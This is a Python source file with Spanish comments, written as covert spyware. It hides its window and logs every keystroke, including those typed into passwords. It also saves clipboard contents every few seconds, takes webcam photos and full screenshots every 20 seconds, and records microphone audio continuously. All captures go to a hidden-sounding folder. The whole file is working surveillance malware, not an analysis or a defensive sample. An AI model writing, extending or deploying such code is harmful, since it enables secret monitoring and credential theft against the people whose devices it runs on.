import tkinter as tk
from tkinter import scrolledtext
from pynput import keyboard
from pynput.keyboard import Key
import os
import pyperclip
import cv2
import threading
import time
from datetime import datetime
from PIL import ImageGrab
import sounddevice as sd
import numpy as np
import soundfile as sf

# Ruta base donde guardar los archivos
folder_path = r"D:\shh"
keylog_path = os.path.join(folder_path, "keylog.txt")
clipboard_path = os.path.join(folder_path, "clipboard.txt")
photo_path = os.path.join(folder_path, "photo.jpg")  # Foto cámara (se reemplaza)

# Carpeta fija para screenshots
screenshots_folder = os.path.join(folder_path, "screenshots")
audios_folder = os.path.join(folder_path, "audios")

# Crear carpetas si no existen
os.makedirs(folder_path, exist_ok=True)
os.makedirs(screenshots_folder, exist_ok=True)
os.makedirs(audios_folder, exist_ok=True)

root = tk.Tk()
root.withdraw()  # Oculta ventana principal

full_text = []  # Lista para almacenar texto tipeado
running = True
exit_key = Key.esc

def on_press(key):
    global running
    if key == exit_key:
        running = False
        listener.stop()
        guardar_al_cerrar()
        root.quit()
        return False
    try:
        if key.char is not None:
            full_text.append(key.char)
    except AttributeError:
        if key == Key.space:
            full_text.append(" ")
        elif key == Key.enter:
            full_text.append("\n")
        elif key == Key.backspace:
            if full_text:
                full_text.pop()

def guardar_periodicamente():
    try:
        with open(keylog_path, "w", encoding="utf-8") as file:
            file.write("".join(full_text))
    except Exception as e:
        print(f"Error al guardar keylog: {e}")

    try:
        clipboard_text = pyperclip.paste()
        with open(clipboard_path, "w", encoding="utf-8") as file:
            file.write(clipboard_text)
    except Exception as e:
        print(f"Error al guardar clipboard: {e}")

    if running:
        root.after(5000, guardar_periodicamente)

def captura_foto_periodica():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: no se pudo acceder a la cámara. Continuando sin capturar fotos.")
        return

    # Primera foto inmediata
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(photo_path, frame)
    else:
        print("Error: no se pudo leer el frame de la cámara.")

    while running:
        time.sleep(20)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite(photo_path, frame)
        else:
            print("Error: no se pudo leer el frame de la cámara.")

    cap.release()

def captura_pantalla_periodica():
    # Captura inmediata
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(screenshots_folder, f"screenshot_{timestamp}.png")
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(filename)
        print(f"Screenshot guardada en: {filename}")
    except Exception as e:
        print(f"Error capturando pantalla: {e}")

    while running:
        time.sleep(20)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(screenshots_folder, f"screenshot_{timestamp}.png")
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(filename)
            print(f"Screenshot guardada en: {filename}")
        except Exception as e:
            print(f"Error capturando pantalla: {e}")

def guardar_al_cerrar():
    try:
        with open(keylog_path, "w", encoding="utf-8") as file:
            file.write("".join(full_text))
    except Exception as e:
        print(f"Error al guardar al cerrar: {e}")

    try:
        clipboard_text = pyperclip.paste()
        with open(clipboard_path, "w", encoding="utf-8") as file:
            file.write(clipboard_text)
    except Exception as e:
        print(f"Error al guardar clipboard al cerrar: {e}")

def show_copied_data():
    copied_text = "".join(full_text)
    clipboard_text = pyperclip.paste()
    result_text = f"Texto tipeado no guardado en archivo (buffer):\n'{copied_text}'\n\nTexto en portapapeles:\n'{clipboard_text}'"

    popup = tk.Toplevel(root)
    popup.title("Copied Data")
    popup.geometry("500x300")
    x = root.winfo_x() + root.winfo_width() // 2 - 250
    y = root.winfo_y() + root.winfo_height() // 2 - 150
    popup.geometry(f"+{x}+{y}")

    text_area = scrolledtext.ScrolledText(popup, wrap=tk.WORD)
    text_area.pack(expand=True, fill="both", padx=10, pady=10)
    text_area.insert(tk.END, result_text)
    text_area.config(state=tk.DISABLED)

show_data_button = tk.Button(root, text="Show Copied Data", command=show_copied_data)
show_data_button.pack(pady=10)

listener = keyboard.Listener(on_press=on_press)
listener.start()

guardar_periodicamente()

threading.Thread(target=captura_foto_periodica, daemon=True).start()
threading.Thread(target=captura_pantalla_periodica, daemon=True).start()

def capturar_audio():
    duration = 30  # Duración de cada grabación en segundos
    fs = 44100  # Frecuencia de muestreo
    interval = 5  # Intervalo entre grabaciones en segundos

    # Verificar dispositivos de audio disponibles
    devices = sd.query_devices()
    print("Dispositivos de audio disponibles:")
    for device in devices:
        print(device)

    # Seleccionar el primer dispositivo de entrada disponible
    input_device = None
    for i, device in enumerate(devices):
        if device['max_input_channels'] > 0:
            input_device = i
            break

    if input_device is None:
        print("No se encontró ningún dispositivo de entrada de audio disponible. Continuando sin capturar audio.")
        return

    print(f"Usando dispositivo de entrada de audio: {devices[input_device]['name']}")

    while running:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        audio_filename = os.path.join(audios_folder, f"audio_{timestamp}.wav")
        print(f"Capturando audio y guardando en: {audio_filename}")
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=devices[input_device]['max_input_channels'], device=input_device)
        sd.wait()
        sf.write(audio_filename, recording, fs)
        print(f"Audio guardado en: {audio_filename}")
        time.sleep(interval)

threading.Thread(target=capturar_audio, daemon=True).start()

root.mainloop()